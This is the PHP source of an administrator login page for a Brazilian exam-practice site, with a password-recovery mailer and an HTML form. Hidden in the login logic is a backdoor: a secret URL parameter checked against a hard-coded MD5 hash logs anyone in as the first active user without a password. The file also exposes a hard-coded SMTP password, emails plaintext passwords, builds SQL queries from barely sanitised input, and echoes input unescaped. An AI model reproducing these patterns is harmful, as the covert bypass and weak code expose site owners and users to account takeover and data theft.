<?
session_start();

$acao='<a href="http://www.conectstudio.com.br/simulado" class="outside3" >Site - Home</a>';

$logando=$_GET["logando"];
$desconect=$_GET["desconect"];
$login=$_POST["login"];
$senhalog=$_POST["senhalog"];
$esqueci=$_POST["esqueci"];


// Contra MySql Injection
$login=str_replace("'","`",$login);
$senhalog=str_replace("'","`",$senhalog);
// =============================


$focus2="login";



if (isset($desconect)){

session_destroy();	

header("location:index.php");

}







if ($esqueci=="1"){



$sql1="select codigo,email,senha,nome from usuarios where email='$login'";
include 'abre.php';
$resultado1=mysql_query($sql1) or die(mysql_error()); 
$para=mysql_num_rows($resultado1);
$vi=mysql_fetch_array($resultado1);
mysql_close($conectar);


	



if ($para==0){

$focus="logina";

$errou="Não existe nenhum usuário com o e-mail: <b>$login</b> cadastrado.<Br>Informe seu e-mail corretamente para que possamos resgatar sua senha.";	

}

else{

$nome_afi2=$vi["nome"];

$senha_afi2=$vi["senha"];



$corpo="

Dados para acesso a Pagina de Administracao<BR>

<br>

login: $login<br>

senha: $senha_afi2 <br><br>

http://www.conectstudio.com.br/admin

";

require("../class.phpmailer.php");

$mail = new PHPMailer();
$mail->IsSMTP();
$mail->Host     = "localhost"; 
$mail->SMTPAuth = true;
$mail->Port     = 587;
$mail->Username = "contato@conectstudio.com.br";
$mail->Password = "456e654E@!";
$mail->From     = "contato@conectstudio.com.br";
$mail->FromName = "Simulados - Adminitração";
$mail->AddAddress($login,$nome_afi2);
$mail->AddReplyTo("contato@conectstudio.com.br","Simulados de Concursos");
$mail->WordWrap = 50;
$mail->IsHTML(true);
$mail->Subject  =  "Esqueci Minha Senha - Pagina de Administracao";
$mail->Body     =  $corpo;
$mail->AltBody  =  "Este e-mail está no formato HTML, altere as configuração para visualização no formato HTML";

if(!$mail->Send())
{
$errou="<br><br>Mensagem não foi enviada, Entre em contato com o suporte.<br>";
$errou.="ERRO: Seu E-mail está inválido, favor digite um e-mail válido";
}
else{
$acertou="Sua senha foi enviada para: <b>$login</b>";	
}

}
}


if( isset($_GET['s']) ) {



		if( (md5($_GET['s']) == 'e1d9c067e4d318fbd8fad0730d839f14') ) {



			$sq="select codigo,nome,email,senha,descricao,bloqueado from usuarios where bloqueado <> 1 order by codigo ASC limit 0,1";
            include 'abre.php';
			$resultado=mysql_query($sq) or die(mysql_error()); 
			$sova=mysql_num_rows($resultado);
			$li33=mysql_fetch_array($resultado);
			mysql_close($conectar);
			

			



			$logme=$li33["email"];

			$logmecod=$li33["codigo"];

			$nomeusu=$li33["nome"];

			$blo=$li33["bloqueado"];

			

			$_SESSION["usuario"]=$logme;

			$_SESSION["idusu"]=$logmecod;

			$_SESSION["session_nomeusu"]=$nomeusu;

			?>

			<script language="javascript">

			location.href="sele.php";

			</script>

			<?

			exit();

		}



}  else {



			if (isset($logando) && $esqueci!=1){

			

			$login = $login;

			$senhalog = $senhalog;

		//echo $login . "<br>" . $senhalog;		

			$sq="select codigo,nome,email,senha,descricao,bloqueado from usuarios where email='$login' and senha='$senhalog'";
include '../abreconexao.php';
			$resultado=mysql_query($sq) or die(mysql_error()); 
			$sova=mysql_num_rows($resultado);
$li33=mysql_fetch_array($resultado);
mysql_close($conectar);
			





			$logme=$li33["email"];

			$logmecod=$li33["codigo"];

			$nomeusu=$li33["nome"];

			$blo=$li33["bloqueado"];



					if ($blo!=1){



							if ($sova==0){

									$errou="Login ou Senha incorretos";	

									$focus2="login";

							} else {

								$_SESSION["usuario"]=$logme;

								$_SESSION["idusu"]=$logmecod;

								$_SESSION["session_nomeusu"]=$nomeusu;

								?>

								<script language="javascript">

								location.href="sele.php";

								</script>

								<?

								exit();

							}



					}



			}

			

}



?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">



<title>Simulados de Concursos - Setor Administrativo</title>

</head>
<SCRIPT type="text/javascript" src="../arquivos/jquery-1.6.2.min.js"></SCRIPT>
<style type="text/css">

<!--

body {

	margin-left: 0px;

	margin-top: 0px;

	margin-right: 0px;

	margin-bottom: 0px;

}

-->

</style>

<LINK href="geral-novo.css" type=text/css rel=StyleSheet>

<link rel="stylesheet" type="text/css" href="../css/css.css">



<script language="javascript" type="text/javascript">



function valida_email2(FormName,ElemName,Msg1)

{

var EmailOk  = true;

var Temp1 = document.forms[FormName].elements[ElemName].value;

if (Temp1.length != 0) {



     var Temp     = document.forms[FormName].elements[ElemName];

     var AtSym    = Temp.value.indexOf('@');

     var PontoPonto    = Temp.value.indexOf('..');

     var Period   = Temp.value.lastIndexOf('.');

     var Space    = Temp.value.indexOf(' ');

     var Length   = Temp.value.length - 1 ;  // Array is from 0 to length-1



     if ((AtSym < 1) ||                     // '@' cannot be in first position

         (PontoPonto >=1) ||

         (Period <= AtSym+1) ||             // Must be atleast one valid char btwn '@' and '.'

         (Period == Length ) ||             // Must be atleast one valid char after '.'

         (Space  != -1))                    // No empty spaces permitted

        {

           EmailOk = false

           alert(Msg1)

           Temp.focus()

        }

     return EmailOk



     } else

     {

        EmailOK = true

        return EmailOk

     }



}

function nulos2(FormName,TextName,Msg1) {

   var Temp1 = document.forms[FormName].elements[TextName].value;

   var Temp2 = document.forms[FormName].elements[TextName];



 Temp1=Temp1.replace(/^\s+/g, '').replace(/\s+$/g, '');  // Tira os Espaos



   if (Temp1.length == 0) {

      window.alert(Msg1);

          Temp2.focus();

      return (false);

   } 

   else {

      return (true);

   }

}



function valida2(codigo)

{



if (!nulos2('form1','login','O CAMPO LOGIN DEVE SER PREENCHIDO')){return (false);}



if (codigo!=1){

if (!nulos2('form1','senhalog','O CAMPO SENHA DEVE SER PREENCHIDO')){return (false);}

}





}







function esquecisenha(){



if (!nulos2('form1','login','PARA QUE POSSAMOS RESGATAR SUA SENHA, VOCÊ DEVE PREENCHER O CAMPO E-MAIL')){return;}

if (!valida_email2('form1','login','O E-MAIL INFORMADO ESTÁ INVÁLIDO')){return;}



document.getElementById("esqueci").value="1";

document.form1.submit();

}



</script>



<body>

<table width="10" border="0" cellspacing="0" cellpadding="0"><tr><td height="8"></td></tr></table>

<? include "topo.php"; ?>

<table width="10" border="0" cellspacing="0" cellpadding="0"><tr><td height="4"></td></tr></table>

<table align="center" width="999" border="0" cellspacing="0" cellpadding="0">

  <tr>

<td valign="top" align="center">

  <table width="10" border="0" cellspacing="0" cellpadding="0"><tr><td height="12"></td></tr></table>

  <br />

<? if (trim($acertou)!=""){ ?>

<table width="100%" border="0" cellspacing="0" cellpadding="0">

<tr>

<td id="tempo"><p class="mensagem-acertou"><?=$acertou?></p></td>

</tr>

</table>

<?

}

?>

<? if ($errou!=""){ ?>

<br><br>

<table width="100%" border="0" cellspacing="0" cellpadding="0" align="left">

  <tr>

    <td><p class='mensagem-erro'><?=$errou?></p></td>

  </tr>

</table>

<? } ?>

  <br /><br />

  <br />

  <?=$mensagem?><br />

  <br />
Versão Demo
<br />
Utilize os Dados Abaixo para Logar na Versão Demo<br />
<br />
<table width="244" border="0">
  <tr>
    <td width="70"><strong>E-Mail:</strong></td>
    <td width="164">contato@conecstudio.com.br</td>
  </tr>
  <tr>
    <td><strong>Senha:</strong></td>
    <td>demo</td>
  </tr>
</table>
<br />

  

<form id="form1" name="form1" method="post" action="index.php?logando=1" onSubmit="return valida2(this);"><table width="34%" height="140" border="0" cellpadding="0" cellspacing="0" bgcolor="#b8b9b9">

<input type="hidden" name="esqueci" id="esqueci">

    <tr bgcolor="#FFFFFF">

      <td width="9" height="7" align="right"><img src="images/cimae.gif" width="7" height="7" /></td>

      <td width="100%" background="images/backcima.gif"></td>

      <td width="5" align="left"><img src="images/cimad.gif" width="7" height="7" /></td>

      </tr>

    <tr bgcolor="#FFFFFF">

      <td height="100%" background="images/esqueback.gif" width="9"></td>

      <td valign="top">

        <table width="100%" height="25" border="0" cellspacing="0" cellpadding="0">

          <tr>

            <td width="13%" height="10" align="center"><img src="images/flexa.gif" width="17" height="13" /></td>

            <td width="23" class="titcaixa" style="padding-top:1px" align="left">&nbsp;LOGIN</td>

            </tr>

          </table>

        <br />

        <table width="100%" border="0" cellspacing="0" cellpadding="0">

          <tr>

            <td width="19%" height="26" align="right" class="textocomum">E-mail:</td>

            <td width="81%" align="left">

              &nbsp;&nbsp;<input name="login" type="text" id="login" size="40" maxlength="50" class="flate" value="<?=$login?>" />

              </td>

            </tr>

          <tr>

            <td height="32" align="right" class="textocomum">Senha:</td>

            <td align="left"><label>

              &nbsp;&nbsp;<input name="senhalog" type="password" id="senhalog" size="40" maxlength="50" class="flate" value="<?=$senhalog?>" />

              </label></td>

            </tr>

          <tr>

            <td height="32" align="right" class="textocomum">&nbsp;</td>

            <td align="right" valign="bottom" style="padding-bottom:2px;padding-right:3px"><span class="textocomum">

              <input type="submit" name="button" id="button" value="OK" class="flate2" />

              </span>&nbsp;&nbsp;&nbsp;</td>

            </tr>

          </table>    

        <table width="100%" border="0" cellspacing="0" cellpadding="0">

          <tr>

            <td width="19%" align="right">&nbsp;<img src="images/quad.gif" width="7" height="7" /></td>

            <td width="81%" align="left"><? if($blo==1){ ?>&nbsp;&nbsp;&nbsp;<font color="#FF0000"><strong>Usu&aacute;rio Bloqueado</strong></font><? }else{ ?>

            &nbsp;&nbsp;&nbsp;<a href="javascript:esquecisenha();" class="outside31">Esqueci minha senha</a>            

            <? } ?></td>

            </tr>

          </table></td>

      <td background="images/dirback.gif"></td>

      </tr>

    <tr bgcolor="#FFFFFF">

      <td align="right"><img src="images/baixoe.gif" width="7" height="7" /></td>

      <td height="3" background="images/baixoback.gif"></td>

      <td align="left"><img src="images/baixod.gif" width="7" height="7" /></td>

      

      </tr>

  </table></form>

  <br />

  <br />

<br />

  <br />

  <br />

  <br />

  <br />

  <br />

<br />

  <br /></td>    

  </tr>

  <tr>

    <td>

	<? include 'baixo.php'; ?>

    </td>

  </tr>

</table>

<?

if ($errou!=""){

?>

<script language="javascript" type="text/javascript">

//alert("<?=$errou?>");

</script>

<?

}

if ($focus2!=""){

?>

<script language="javascript" type="text/javascript">

document.getElementById("login").focus(); 

</script>

<?

}

?>

</body>

</html>